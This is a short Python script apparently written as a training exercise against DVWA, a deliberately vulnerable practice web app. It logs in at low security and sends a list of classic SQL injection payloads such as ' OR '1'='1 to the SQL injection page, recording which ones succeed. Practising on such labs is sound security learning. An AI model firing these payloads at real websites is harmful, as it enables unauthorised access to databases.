import logging
import requests

from dvwa.globals import DVWA_URL, DVWA_LOG_LEVEL
from dvwa.utils import login_session


def main():
    url = f"{DVWA_URL}/vulnerabilities/sqli/"
    session = requests.Session()
    session.cookies.set("security", "low")
    session = login_session(session)
    payloads = [
        "this shouldn't work",
        "' OR '1'='1",
        "' OR '1'='1' -- ",
        "' OR 1=1#",
        "' OR 1=1-- ",
        "1' OR '1'='1",
    ]

    for payload in payloads:
        params = {"id": payload, "Submit": "Submit"}
        response = requests.get(url, params=params, cookies=session.cookies.get_dict())

        if "Welcome" in response.text or "ID" in response.text:
            logging.info(f"Successful payload: {payload}")
        else:
            logging.info(f"Payload failed: {payload}")


if __name__ == "__main__":
    logging.basicConfig(level=DVWA_LOG_LEVEL)
    main()
